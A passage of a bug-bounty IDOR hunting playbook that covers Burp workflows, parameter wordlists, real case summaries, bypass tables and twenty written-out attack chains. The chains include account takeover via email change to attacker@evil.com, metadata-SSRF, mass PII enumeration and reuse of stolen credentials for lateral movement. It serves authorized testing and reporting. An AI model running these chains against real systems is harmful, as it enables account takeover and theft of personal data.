- RAG endpoints: `namespace` / `partition` / `vector_collection` ID swaps.

---

## Burp Workflows — Autorize / PwnFox / Auth Analyzer / AuthMatrix

### Autorize (auto-detect while browsing)
```
1. Burp → Extender → BApp Store → Install "Autorize"
2. Configuration → paste low-priv Cookie/Bearer (B's)
3. Set "Enforcement Detector" → equal/different/string-match rules
4. Flip "Autorize is OFF" → "Autorize is ON"
5. Browse app as high-priv user A
6. Every request automatically re-sent with B's cookie
7. Green=enforced, Red=bypass, Yellow=manual review
8. Triage reds in Repeater
```

### PwnFox (multi-account in single browser)
- Firefox extension; each color tab = separate identity (cookies/storage isolation).
- Red tab = User A, blue tab = User B.
- Burp Pro + PwnFox extension shows color-coded requests.

### Auth Analyzer (Burp BApp — newer)
- Finer-grained rule-based replay than Autorize.
- Better for GraphQL + JSON workflows.

### AuthMatrix
- Define users × requests in a matrix.
- Click-to-run all permutations; color-coded results.
- Best for multi-role apps (admin / manager / member / guest).

### Burp Repeater "switch role" workflow
1. Send A's request to Repeater.
2. Right-click → "Send to Repeater" again as separate tab.
3. Replace Authorization/Cookie with B's.
4. Send. Compare side-by-side.

---

## Hidden Parameter & Endpoint Wordlist

### Parameter names to spray
```
id        uid        user_id        userId        user-id        user[id]
account   account_id accountId      acct          acct_id
owner     owner_id   ownerId        target        target_id
recipient recipient_id              receiver      receiver_id
actor     actor_id   subject        principal     impersonate
org       org_id     organization   tenant        tenant_id   workspace_id
project   project_id projectId
team      team_id    group_id       channel_id    space_id
customer  customer_id              client_id
member    member_id  assignee_id    delegate
on_behalf_of  impersonate_user_id  as_user        masquerade
uuid      guid       slug           handle        external_id
conversation_id   session_id        thread_id     agent_id   copilot_id
lead_id    applicant_id             candidate_id
namespace  partition  vector_collection
```

### Endpoint patterns to fuzz
```
/api/v0/         /api/v1/         /api/v2/         /api/v3/
/api/v0/admin    /api/v1/admin    /api/internal    /api/private
/api/staff       /api/manage      /api/_internal
/api/beta        /api/alpha       /api/preview     /api/_next
/api/legacy      /api/old         /api/v1-old      /api/v0-deprecated
/api/grpc        /api/jsonrpc     /api/soap
/admin/api       /staff/api       /internal/api
/api/users/me    /api/users/{}    /api/users/by-email
/api/export      /api/download    /api/reports
/api/scim/v2/Users               /api/scim/v2/Groups
/api/audit       /api/logs        /api/billing
/api/featureflags                /api/settings/{}
/api/v*/copilot  /api/v*/ai       /api/v*/agents
/api/v*/chats    /api/v*/conversations
/api/v*/rag/{namespace}/query    /api/v*/embeddings
```

Use SecLists `Discovery/Web-Content/api/objects.txt` + `api/api-endpoints.txt` + `raft-large-files.txt`.

---

## Real Bug Bounty Case Studies (Updated 2026)

### Case A — McHire (McDonald's) 2025 — 64M PII
- Researchers: Ian Carroll + Sam Curry.
- Entry: default `123456:123456` at `mchire.com/signin`.
- **Endpoint**: `PUT /api/lead/cem-xhr` (NOT a GET REST endpoint — note the method).
- Param: `lead_id` — sequential int up to ~64,185,742.
- Decrement → full PII + chat transcripts + auth tokens.
- Lesson: AI chatbot platforms + default creds + sequential int = $50k-class.

### Case B — HackerOne Copilot 2023 — $2,500
- **Endpoint**: GraphQL mutation `DestroyLlmConversation`.
- IDOR on conversation_id; unreleased feature → still found via introspection.
- Lesson: introspection-enabled GraphQL leaks ALL mutations, including pre-release ones.

### Case C — HackerOne CreateOrUpdateHackerCertification — $12,500
- GraphQL mutation accepts certification IDs without owner-check → delete any.
- Lesson: GraphQL mutations top-paying class 2024-2026.

### Case D — PayPal businessmanage — $10,500
- `POST /businessmanage/users/api/v1/users` accepts arbitrary `business_account_id`.
- Attacker added as secondary user → full financial controls.

### Case E — Shopify GraphQL billingDocumentDownload — $5,000
- Relay IDs (base64 `BillingDocument:N`) decoded → incremented → re-encoded.
- Cross-merchant billing PDF read.

### Case F — Reddit Mod Logs — $5,000
- `/api/v1/mod_logs?subreddit={target}` — `subreddit` param not checked vs caller's mod status.

### Case G — Stripe Connect GraphQL — disclosed
- Cross-tenant IDOR on `UpdateAtlasApplicationPerson`.
- Connected-account data accessible across Stripe orgs.

### Case H — Yelp CC linking — composite
- Reservation endpoint accepts `payment_method_id` + `user_id` independently.
- Pair victim's CC with attacker order → free meals.
- Lesson: Two-IDOR composition.

### Case I — Unikrn cashier — $3,000
- `/cashier/info?user_id=N` → email + phone returned.

### Case J — Mozilla session misbinding — disclosed
- Session token + arbitrary `user_id` param → wrong-user account-delete.

### Case K — Autodesk deleteProfileImages — disclosed
- GraphQL `deleteProfileImages(id:)` mutation lacks owner-check.

### Case L — GitLab ML Models — $1,160
- UUID swap → access models of any project.

### Case M — Bykea zombie endpoint — disclosed
- Hardcoded endpoint in mobile app, never tested on web → IDOR.
- Lesson: decompile every APK.

### Case N — SingleStore scheduled jobs — disclosed
- `/api/v1/notebook/scheduled-jobs?projectID=VICTIM` → stored creds in job config.
- Second-order IDOR — scheduled job stores user_id, retrieved later without re-auth.

### Case O — TikTok AddRulesToPixelEvents — disclosed
- Cross-tenant on tracking-pixel endpoints.

### Case P — TikTok Memory Privacy — disclosed
- `aweme_id` param → modify others' Memory privacy.

### Case Q — Starbucks Singapore ATO — disclosed
- PHPSESSID cookie copied from staging to prod → user info + password change.
- Lesson: cookie session swap between subdomains.

### Case R — Automattic CrowdSignal — disclosed
- IDOR on email edit endpoint → password reset → ATO.

### Case S — GitHub cross-repo bypass-reviewers (#3560256)
- `owner_id` body param in `PATCH /repos/B/.../delegated-bypass-reviewers` modifies Repo B's settings from attacker's admin context on Repo A.

### Case T — IBM method-bypass IDOR (#2456603)
- GET returns 403 but POST/PUT/PATCH return 200 on same `/api/admin/users/{id}`.

### Case U — Revive Adserver Manager-vs-Manager (#3401612, 2025)
- Manager A can delete banners belonging to Manager B by passing banner_id.

### Case V — Flowise DocumentStore (CVE-2026-41277)
- Mass-assignment + IDOR composite — client supplies primary key in POST → UPSERT migrates object to attacker's workspace.

### Case W — Apple SEED program (DEF CON 33, Richard Im)
- Broken access control on consultants.apple.com / getsupport.apple.com.
- $7,500 historical IDOR per writeup community.

### Case X — Easy!Appointments (BOLABuster 15-finder)
- 15 BOLA endpoints found by Unit 42 LLM tooling.

### Case Y — Grafana CVE-2024-1313 (BOLABuster)
- Cross-org dashboard delete by low-priv via snapshot keys.

### Case Z — Harbor CVE-2024-22278 (BOLABuster)
- Maintainer escalates to admin-only metadata ops.

---

## Bypass Techniques (2026 expanded table)

| Defense | Bypass |
|---------|--------|
| UUID instead of int | Harvest from listings/emails/exports/JS bundles/Wayback/JSON-LD |
| UUIDv1 | Sandwich Attack (uuidv1_exploit, UUIDv1 Sandwicher) |
| UUIDv7 timestamp | Privacy/timing class — not direct IDOR but supports recon |
| Snowflake IDs | Predict (timestamp, machine, sequence) |
| Indirect hash | Decode base64; check md5/sha1 of known fields; check hashids w/ empty secret |
| Short-lived per-resource tokens | Often reusable across users (not bound to caller) |
| Rate-limited enum | Slow + multi-IP + harvest IDs from non-enum endpoints; GraphQL alias batching |
| user_id in WHERE clause | Try different API version /v1 vs /v2; mobile API |
| CORS restrictions | Irrelevant — test from own session |
| Opaque server-side refs | Find endpoint LEAKING internal ID (errors, Location, metadata) |
| Param-name filtering | Try variants: user_id, userId, uid, account, owner; HPP `?id=mine&id=victim` |
| Type-strict validation | Array `[123]`, object `{value:123}`, bool, wildcard, neg, decimal |
| Wildcard | `*`, `null`, ``, `-1`, `0` |
| Method whitelist | GET 403 → POST/PUT/PATCH/DELETE/HEAD/OPTIONS variants + override headers |
| Route allowlist | `.json` `.xml` `.csv` `.pdf` variant; `/api/internal/`; `/admin/` prefix |
| API gateway scope | Mobile API often skips gateway; direct origin call bypasses scope |
| Reverse proxy auth | X-Original-URL / X-Rewrite-URL header injection |
| Path-normalize | `/../`, `%2e%2e`, double-encode, null byte, whitespace |
| Content-Type strict | Swap to XML / form-urlencoded / text/plain |
| Static keywords (me/current/self) | Substitute numeric/UUID ID |
| 2FA on caller | Doesn't apply — testing object auth, not auth-to-call |
| JWT sub claim | Tamper sub claim if `sub` derives object scope (see hunt-jwt) |
| Mass-assignment block on `id` | Try `owner_id`, `user_id`, nested `{user:{id:...}}` |
| GraphQL direct-query block | Use `node(id:)` Relay bypass (CVE-2025-31481) |
| GraphQL rate limit per HTTP req | Alias-batch 10k queries in single HTTP request |

---

## Validation Gate (Triage-ready 2026)

### Gate 1 — Specific action
"From Account B (attacker), the request `<EXACT_HTTP_REQUEST>` returns Account A's private resource: `<EXACT_DATA_RETURNED>`. Account B has no legitimate relationship to Account A."

### Gate 2 — Verifiable loss
- Confidentiality: "Victim's invoice $124.50 to address 123 Main St exposed."
- Integrity: "Attacker silently modified victim's email to attacker@evil.com."
- Availability: "Attacker deleted victim's project containing 12,000 records."

### Gate 3 — 10-minute reproduction
- Two fresh accounts created during PoC ✓
- Exact HTTP request documented (Burp screenshot or raw curl) ✓
- 200 OK response showing victim's data (not yours, not empty) ✓
- No reliance on pre-existing state / race / special timing ✓

### Gate 4 — Confirm 3× (non-determinism guard)
- Reproduce 3 times with cleared cache / fresh session.
- If reproduction is < 100%, document conditions (load? specific time? specific user state?).

### Anti-patterns (auto-rejected 2026)
- Returns YOUR data regardless of ID → session-trust, not IDOR
- 200 with empty array `[]`
- 200 with redacted fields (`****`)
- 200 with "access denied" in JSON body
- Public resource intentionally readable
- 404 on guessed UUID (probe, not access)
- Single-resource access without victim identifier
- Behind admin login you don't have
- "Could be IDOR" / "probably enumerable" without dump
- "Bypassing rate-limit via aliasing" without victim PII

---

## Chain Templates (IDOR → bigger bounty)

### Chain 1 — IDOR PATCH /users/{id} → email change → ATO
```
1. PATCH /api/users/VICTIM_ID  body:{"email":"attacker@evil.com"}
2. POST /password/reset  body:{"email":"attacker@evil.com"}
3. Reset arrives at attacker
4. Set new password → login as victim
→ Critical ATO (Automattic CrowdSignal #915114 pattern)
```

### Chain 2 — Mass-assignment IDOR composite → ATO
```
1. PATCH /api/users/me body:{"email":"attacker","user_id":"VICTIM"}
2. Server applies email change to VICTIM
3. Reset → ATO
```

### Chain 3 — Cross-tenant IDOR → full org takeover
```
1. Sign up Org B. Find Org A's IDs via leaked notification/webhook/email.
2. POST /api/orgs/ORG_A/members body:{"role":"OWNER","email":"attacker"}
3. Server doesn't check Org-B-session vs Org-A-target
→ Critical mass org-ATO (Shopify Partners $15,250 pattern)
```

### Chain 4 — Sequential enum → mass PII (McHire template)
```
1. Find /api/lead/cem-xhr or /api/users/{n} or /api/leads/{n}
2. Burp Intruder Null Payloads (1..N), filter 200
3. Extract name+email+phone+address per hit
→ Critical mass PII (64M precedent)
```

### Chain 5 — Second-order IDOR via scheduled job → stored creds
```
1. GET /api/scheduled-jobs?projectID=VICTIM_PROJ
2. Response includes stored DB creds / API tokens
3. Use creds for lateral movement
→ Critical (SingleStore #3219944)
```

### Chain 6 — Relay node interface → cross-tenant
```
1. Decode current Relay ID: base64("Order:12345") = "T3JkZXI6MTIzNDU="
2. Increment: "Order:12346"
3. Re-encode: "T3JkZXI6MTIzNDY="
4. query { node(id:"T3JkZXI6MTIzNDY="){...on Order{customer{email} total}} }
5. CVE-2025-31481 — `node(id:)` may bypass checks `book(id:)` enforces
→ Critical (Shopify $5,000 template)
```

### Chain 7 — UUIDv1 Sandwich → password-reset hijack
```
1. Reset on own account at T1 → capture UUID-A
2. Trigger victim reset at T1+Δ
3. Reset on own account at T1+2Δ → capture UUID-B
4. MAC = UUID-A.MAC; timestamp ∈ [T1, T1+2Δ]; clock_seq bounded
5. Brute-force candidates against /password/reset?token=
→ Critical 0-click ATO (landh.tech pattern)
```

### Chain 8 — Mobile zombie endpoint IDOR
```
1. Decompile APK (jadx-gui)
2. grep endpoints not in web app
3. Test with two-account method
4. Often /api/_legacy/, /api/mobile/, /api/v0/ — pre-auth or auth-skipped
→ $5k-$15k easy wins (Bykea pattern)
```

### Chain 9 — Method-tampering IDOR (IBM #2456603)
```
1. GET /api/admin/users/{n} → 403
2. POST /api/admin/users/{n} → 200
3. Mass-PII via POST enumeration
→ High → Critical
```

### Chain 10 — IDOR + Auth-bypass via .json route variant
```
1. GET /bugs/{n}     → 403 (login redirect)
2. GET /bugs/{n}.json → 200 (privacy enforced only on HTML controller)
→ Mass private-report disclosure (H1 #2487889 pattern)
```

### Chain 11 — IDOR → SSRF → cloud creds
```
1. POST /api/preview body:{"url":"http://attacker"} — accepts arbitrary URL
2. Try internal: {"url":"http://169.254.169.254/latest/meta-data/..."}
3. If indirect via stored preview record → second-order SSRF on backend worker
→ Critical (chain to hunt-metadata-ssrf)
```

### Chain 12 — Webhook IDOR → victim payload theft
```
1. Webhooks delivered with object ID in URL
2. Register webhook URL → attacker server
3. Receive UUIDs/IDs in incoming payloads
4. Use harvested IDs in direct API calls as different user
→ Mass cross-tenant data
```

### Chain 13 — Blind IDOR → 2FA disable → ATO
```
1. POST /api/users/{victim}/disable-2fa  with attacker session
2. Silent state change (no visible response)
3. Trigger password reset → 2FA no longer required → ATO
→ Critical silent ATO
```

### Chain 14 — Notification IDOR → DM hijack
```
1. /api/notifications?user_id=VICTIM returns victim's notifications
2. Contains DM thread IDs → /api/threads/{id} as attacker → read DMs
3. DMs contain OTPs / session tokens → ATO
```

### Chain 15 — GraphQL alias-batch → 10k UUIDs/req
```
{ a1:user(id:"u1"){email} a2:user(id:"u2"){email} ... a10000:user(id:"u10000"){email} }
→ Bulk PII bypassing per-request rate limits (Checkmarx 1B→100k pattern)
```

### Chain 16 — Mass-assignment + cross-workspace IDOR (Flowise CVE-2026-41277)
```
1. POST /api/v1/document-store {"id":"VICTIM_OBJ","workspaceId":"ATTACKER_WS"}
2. UPSERT logic with client primary key → object reassigned to attacker
3. Attacker reads/modifies victim's data via new workspace
→ Critical cross-tenant object takeover
```

### Chain 17 — Cookie session-swap ATO (Starbucks #876300)
```
1. Find PHPSESSID/session cookie used across multiple subdomains
2. Copy attacker session cookie to victim subdomain
3. Authentication leaks across boundary → user info + password change
→ Critical cross-subdomain ATO
```

### Chain 18 — AI conversation IDOR (HackerOne #2218334 / McHire)
```
1. Introspect GraphQL — find LLM mutation/query
2. mutation { destroyLlmConversation(id:"VICTIM_CONV"){ok} }
3. Or: GET /api/conversations/{conv_id}/messages
→ Cross-user chat history / actions
```

### Chain 19 — GitHub cross-repo bypass (#3560256)
```
1. Attacker admin on Repo A
2. PATCH /repos/B/secret-scanning/push-protection/delegated-bypass-reviewers
   {"owner_id":"REPO_B_OWNER"}
3. Server applies to Repo B
→ Critical cross-tenant config
```

### Chain 20 — Yelp two-IDOR composite (#391092)
```
1. IDOR-1: order endpoint accepts arbitrary payment_method_id
2. IDOR-2: confirmation skips PM ownership re-check
3. Pair victim's stored CC with attacker order → free purchase
→ Direct financial loss (composite is critical, neither alone is)
```

---

## Severity Map (2026 update)

| Finding | Severity |
|---------|----------|
| Self-only access (returns YOUR data regardless of ID) | Info |
| 200 with empty payload | Info |
| Public resource confirmed public | Info |
| Read of single other-user resource (low-PII) | Low |
| Read of single other-user resource (PII/financial) | Medium |
| Read of single other-user resource (PII + email + phone) | High |
| Write to other-user resource (silent state change) | High |
| Delete other-user resource | High |
| Mass-enumerable read of PII (sequential/harvestable IDs) | **Critical** |
| Cross-tenant read in multi-tenant SaaS | **Critical** |
| IDOR → ATO chain (email change, password reset, 2FA disable) | **Critical** |
| IDOR with financial impact (transfer, refund, free purchase) | **Critical** |
| IoT/vehicle/health-device IDOR (physical safety) | **Critical** (max) |
| Add self as admin/owner of victim's account | **Critical** |
| Mass-assignment cross-workspace object takeover | **Critical** |
| AI conversation/agent session IDOR with PII | **Critical** |
| Pre-auth IDOR (no creds needed, mass PII) | **Critical** (max) |

---

## Reporting Template (Triage-Optimized)

```
Title: [Severity] IDOR on <endpoint> allows <action> against any <user/org>

Summary:
Authenticated low-privilege user can <read/write/delete> <data class>
belonging to any other <user/org> by manipulating <param/header/body field>
to any other entity's identifier.
<Quantify: N users affected, $X impact, ATO chain feasible>.

Reproduction (10 minutes from zero):
1. Sign up Account A (Organization A if SaaS).
2. Sign up Account B (Organization B if SaaS, separate).
3. As Account A: <action creating resource X> → ID is <ID>.
4. As Account B: send request:

<FULL HTTP REQUEST or curl one-liner with both accounts visible>

5. Response (200 OK) returns Account A's data:

<PASTE NON-SENSITIVE SAMPLE — partial PII, redacted email/ID>

Impact:
- Confidentiality: <names + emails + phones of N users harvested>
- Integrity: <fields modifiable on victim records>
- Availability: <deletion of victim assets>
- Financial: <cents/dollars at risk × scale>
- ATO chain: <email-change-IDOR → reset → full ATO>

CVSS 3.1: AV:N / AC:L / PR:L / UI:N / S:C / C:H / I:H / A:N = High/Critical

Suggested fix: (omit per policy — programs prefer no patch code)
```

---

## Modern Detection / Triage Tools (2026 reference)

| Tool | Use | License |
|------|-----|---------|
| **Autorize** | Auto-replay every request with B's cookie while browsing | Burp BApp |
| **Auth Analyzer** | Finer-grained rule-based replay; better for GraphQL | Burp BApp |
| **AuthMatrix** | Matrix users × requests; click-to-run permutations | Burp BApp |
| **PwnFox** | Firefox container-per-tab identity, color-coded Burp | Firefox+Burp |
| **jwt_tool** | JWT alg=none, kid traversal, claim tampering | CLI |
| **uuidv1_exploit** | UUIDv1 prediction | Python |
| **CrackQL** | GraphQL alias-batch brute force | Python |
| **Turbo Intruder** | High-throughput Burp brute (built for batching) | Burp extension |
| **jadx-gui** | Android APK decompile | GUI |
| **Frida** | Runtime mobile API hook (encrypted bodies) | CLI/Python |
| **MobSF** | Mobile static analysis | Docker |
| **BOLABuster** (research) | OpenAPI → LLM-driven BOLA finder | Research |
| **Hadrian / APIsec / Salt** | Commercial automated BOLA scanners | Commercial |
| **Escape Agentic DAST** | AI-driven business-logic finder | Commercial |
| **Semgrep AI** | Hybrid SAST+LLM IDOR detection | Commercial beta |

---

## Self-Improving Heuristics

### What modern LLM-based AI tools find easily (so don't bother — devs will auto-fix soon)
- Absent authz check (commented-out, missing line) — 68% TP rate (Semgrep, 2025).
- Single-file authz logic.

### What humans should hunt for premium bounties (LLMs miss these)
- Cross-file RBAC (LLMs score 0-10%).
- Framework-implicit authz (decorators, middleware, inherited classes — 0% TP).
- Multi-step business logic (Yelp two-IDOR composite class).
- Second-order IDOR (scheduled jobs, async).
- Mass-assignment composites.
- Mobile zombie endpoints.
- GraphQL Relay node bypass (CVE-2025-31481 class).
- UUIDv1 Sandwich Attack.
- Cross-tenant via header injection.
- AI-chatbot conversation IDOR.

---

## Fallback Chain (when stuck)

1. Test numeric IDs — ±1, ±100, then mass loop.
2. Test UUIDs — harvest from listings, emails, exports, JS bundles, sourcemaps, JSON-LD, Wayback, search-engine cache.
3. Test UUIDv1 prediction (Sandwich) if generation pattern observed.
4. Test encoded IDs — base64, MD5/SHA, hashids (empty secret).
5. Test Snowflake — predict (timestamp, machine, sequence).
6. Move ID location: path → query → JSON body → header → cookie → GraphQL var → WS frame → multipart.
7. Test ALL methods: GET/POST/PUT/PATCH/DELETE/HEAD/OPTIONS + override headers.
8. Test API versions: /v1, /v2, /v3, /v0, /api/internal/, /api/_legacy/, /api/private/, /api/mobile/.
9. Test route variants: `.json` `.xml` `.csv` `.pdf` `/raw` `/preview` `/print` `/export`.
10. Test parameter pollution (HPP): `?id=mine&id=victim`, JSON dupe keys.
11. Test JSON type-confusion: array, object, bool, wildcard, null, neg, decimal.
12. Test content-type swap.
13. Test X-Original-URL / X-Rewrite-URL / X-Forwarded-Path injection.
14. Test path-normalize: `..`, `%2e%2e`, double-encode, null byte.
15. Test "me/current/self" → numeric substitution.
16. Test Blind IDOR — write/delete actions, verify state change as victim.
17. Test Second-Order — scheduled jobs, exports, notifications, webhooks.
18. Test Multi-Tenant cross-org with separate Orgs A and B.
19. Test mass-assignment IDOR — inject `user_id`/`owner_id`/`workspaceId`/`id` in POST/PATCH body.
20. Decompile mobile app — grep endpoints — test each one with Frida if encrypted.
21. Use Autorize + PwnFox + Auth Analyzer + AuthMatrix while you browse.
22. GraphQL: introspect → enumerate id-arg queries/mutations/subscriptions → alias-batch enumerate.
23. Relay IDs: decode → increment → re-encode → re-query (and try `node(id:)` if direct query is protected).
24. Test write/destructive ops on every "read-only" endpoint via method tampering.
25. Chain: IDOR-read → IDOR-write → email change → reset → ATO.
26. Mark endpoint clean ONLY when ALL types tested in ALL locations under ALL methods with ALL bypass techniques.

---

## Cross-References

- `hunt-bac-privesc` — BAC parent skill; vertical privesc + role tampering + 403 bypass
- `hunt-graphql` — GraphQL introspection, alias batching, mutations, Relay node bypass
- `hunt-ato` — IDOR → email change → password reset chain
- `hunt-auth-bypass` — Pre-auth IDOR via missing middleware
- `hunt-api-misconfig` — Mass assignment, zombie endpoints, hidden parameters
- `hunt-business-logic` — Composite chains (Yelp two-IDOR class)
- `hunt-jwt` — JWT sub-claim tampering for "self" endpoints
- `hunt-oauth` — Scope-upgrade chains
- `hunt-second-order` — Scheduled jobs / async / webhook delivery IDOR
- `hunt-metadata-ssrf` — IDOR → SSRF → IMDS cloud creds
- `hunt-mfa-bypass` — 2FA-disable IDOR
- `hunt-websocket` — WS-frame IDOR + subscription auth bypass
- `hunt-llm-ai` — AI chatbot / agent session IDOR (McHire-class)
- `security-arsenal` — Full IDOR bypass-table reference
- `triage-validation` — 7-question gate before reporting
- `critical-attack-matrix` — Per-pattern PoCs and severity templates

---

## Golden Heuristics (Updated 2026)

- **"Two accounts, every endpoint, every method, every location."** — the canonical loop
- **"GraphQL mutations are the top-paying IDOR class 2024-2026."** — $12,500 (HackerOne) and $5,000 (Shopify) confirm
- **"AI chatbot / agentic copilot session IDORs are the new mega-class."** — McHire 64M precedent
- **"The .json route variant trick wins more bugs than any payload."** — H1 #2487889
- **"Relay IDs are integers wearing a base64 hat. Always decode. Then try `node(id:)` to bypass `book(id:)` checks."** — CVE-2025-31481
- **"Mass-assignment + IDOR composite is the #1 ATO chain in 2026."** — Flowise CVE-2026-41277
- **"UUIDv4 alone isn't security — find where it leaks. UUIDv1 IS predictable — Sandwich Attack."**
- **"Sequential IDs in mobile APIs pay $50k. Always decompile + Frida the encryption."**
- **"Blind IDOR on 2FA-disable is the silent ATO."**
- **"Cross-tenant > cross-user. Always have two orgs ready."**
- **"If it touches money, billing, or admin — try every HTTP verb."**
- **"Autorize while you browse. PwnFox to switch identity. Auth Analyzer for fine grain. AuthMatrix for role matrices."**
- **"Second-order IDOR lives in scheduled jobs, webhooks, exports, and AI agent context."**
- **"When triage says 'returns your data' — find the ID-location they didn't fix (header, cookie, GraphQL var, WS frame)."**
- **"A 200-with-other-user-data screenshot wins reports faster than any narrative."**
- **"LLMs are catching absent-authz IDORs. Hunt cross-file RBAC and framework-implicit authz for premium bounties."**
- **"Default creds + sequential int + admin proxy = McHire-class. Always check for `123456:123456` / `admin:admin` first."**
- **"Method tampering: GET 403 → POST 200 is the IBM #2456603 pattern that still works in 2026."**
- **"Parameter pollution is alive. Try `?user_id=mine&user_id=VICTIM` everywhere."**
- **"JSON type-confusion: `{id:[123]}`, `{id:{value:123}}`, `{id:-1}`, `{id:null}` — at least one will surprise you."**
- **"X-Original-URL / X-Rewrite-URL — edge auth keyed on path, backend serves header."**
- **"Cookie session swap between subdomains (Starbucks #876300) — still works in 2026."**
- **"Webhook deletion IDORs pay because they break business integrations — easy critical."**
- **"GraphQL alias-batch turns rate-limited brute-force into a single-request mass-enum."**
- **"PoC or GTFO. `200 OK` with victim PII, every time."**
